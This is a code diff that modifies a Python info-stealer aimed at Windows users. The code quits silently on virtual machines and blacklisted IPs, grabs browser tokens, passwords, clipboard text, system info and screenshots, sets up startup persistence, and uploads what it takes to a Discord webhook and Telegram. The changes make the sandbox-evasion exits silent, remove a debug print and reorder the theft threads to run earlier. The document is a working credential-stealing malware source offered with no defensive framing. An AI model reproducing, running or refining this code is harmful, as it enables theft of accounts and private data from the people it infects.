@@ -20,7 +20,7 @@ import os.path, zipfile
 import shutil, json, sqlite3
 import tempfile, datetime
 from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
-
+start_time = time.time()
 webhook = '%Webhook%' 
 
 FakeWebhook = '%FakeWebhook%'
@@ -106,7 +106,7 @@ def check_ip():
         try:
             ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
             if ip[::-1] in blacklisted:
-                exit_program('Ip Blacklisted')
+                exit_program('')
             return
         except:
             pass
@@ -118,7 +118,7 @@ def check_registry():
         for i in range(subkey_count):
             subkey = winreg.EnumKey(key, i)
             if subkey.startswith('VMWARE'):
-                exit_program('Detected Vm')
+                exit_program('')
         winreg.CloseKey(key)
     except:
         pass
@@ -126,7 +126,7 @@ def check_registry():
 def check_dll():
     sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
     if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
-        exit_program('Detected Vm')
+        exit_program('')
 
 
 
@@ -889,7 +889,6 @@ def getTokq(path, arg):
                         if checkTokq(Tokq):
                             if not Tokq in Tokqs:
                                 Tokqs += Tokq
-                                print(Tokqs)
                                 uploadTokq(Tokq, path)
 
 def GetDiscord(path, arg):
@@ -988,7 +987,9 @@ def getPassw(path, arg):
     
     
 def getinfo():
+    
     try:
+
         sysinfo = systemInfo()
         globalinfo = globalInfo()
         clipboardtext = Clipboard()
@@ -1189,15 +1190,22 @@ def srcs():
     try:
         img_path = os.path.join(os.path.expanduser("~"), "screenshot.png")
 
-        timestamp = str(int(time.time()))
-        rah2 = 'dneS'
         if os.name == "nt":
-            command = ["powershell", "-Command", f"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.{rah2[::-1]}Keys]::{rah2[::-1]}Wait(\"{0}\" ); Start-Sleep -m 500; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $screen.width, $screen.height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); $bmp.Save(\"{1}\")"]            
-            command[2] = command[2].format("{PRTSC}", img_path)
-        else:
-            command = ["import", "-window", "root", img_path]
+            powershell_command = f'''
+                Add-Type -AssemblyName System.Windows.Forms
+                [System.Windows.Forms.Keys]::PrintScreenKey.Wait("{0}")
+                Start-Sleep -Milliseconds 500
+                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+                $bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
+                $graphics = [System.Drawing.Graphics]::FromImage($bmp)
+                $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size)
+                $bmp.Save("{1}")
+            '''
+            powershell_command = powershell_command.format("{PRTSC}", img_path)
 
-        subprocess.run(command, shell=True)
+            subprocess.run(["powershell", "-Command", powershell_command], shell=True)
+        else:
+            subprocess.run(["import", "-window", "root", img_path], shell=True)
 
         with open(img_path, "rb") as file:
             file_data = file.read()
@@ -1403,7 +1411,15 @@ def GatherAll():
     aa = []
     global injection
     global DiscordStop
-    
+    if Startup == True:
+        sta = threading.Thread(target=startup)
+        sta.start()
+        aa.append(sta)
+    else:
+        pass
+    az = threading.Thread(target=upload_files_to_discord)
+    az.start()
+    aa.append(az)
     for patt in browserPaths:
         tokq = threading.Thread(target=getTokq, args=[patt[0], patt[2]])
         tokq.start()
@@ -1422,7 +1438,23 @@ def GatherAll():
         a.start()
         coc.append(a)
 
-    for thread in coc: thread.join()
+        
+    eeee = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
+
+    a = threading.Thread(target=getinfo)
+    a.start()
+    aa.append(a)
+    aa = []
+    
+    
+    hist = threading.Thread(target=histup)
+    hist.start()
+    aa.append(hist)
+    
+    scr = threading.Thread(target=srcs)
+    scr.start()
+    aa.append(scr)
+    
     try:
         if antidebugging == True:
             ad = threading.Thread(target=antidebug)
@@ -1452,14 +1484,12 @@ def GatherAll():
     except:
         pass
     
-    for thread in aa:
+    paaz_thread = threading.Thread(target=paaz)
+    paaz_thread.start()
+    aa.append(paaz_thread)
+    for thread in coc:
         thread.join()
         
-    e = []
-    a = threading.Thread(target=paaz)
-    a.start()
-    e.append(a)
-    
     if Fakegen == True:
         us = threading.Thread(target=fakegen)
         us.start()
@@ -1471,38 +1501,7 @@ def GatherAll():
         wb.start()
         aa.append(wb)
         
-    eeee = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
-
-    a = threading.Thread(target=getinfo)
-    a.start()
-    aa.append(a)
-    aa = []
-    
     for thread in aa:
         thread.join()
-    
-        
-    if Startup == True:
-        sta = threading.Thread(target=startup)
-        sta.start()
-        aa.append(sta)
-    else:
-        pass
-    
 
-    hist = threading.Thread(target=histup)
-    hist.start()
-    aa.append(hist)
-    
-    scr = threading.Thread(target=srcs)
-    scr.start()
-    aa.append(scr)
-    
-    az = threading.Thread(target=upload_files_to_discord)
-    az.start()
-    aa.append(az)
-    
-    for thread in aa:
-        thread.join()
-        
 GatherAll() 
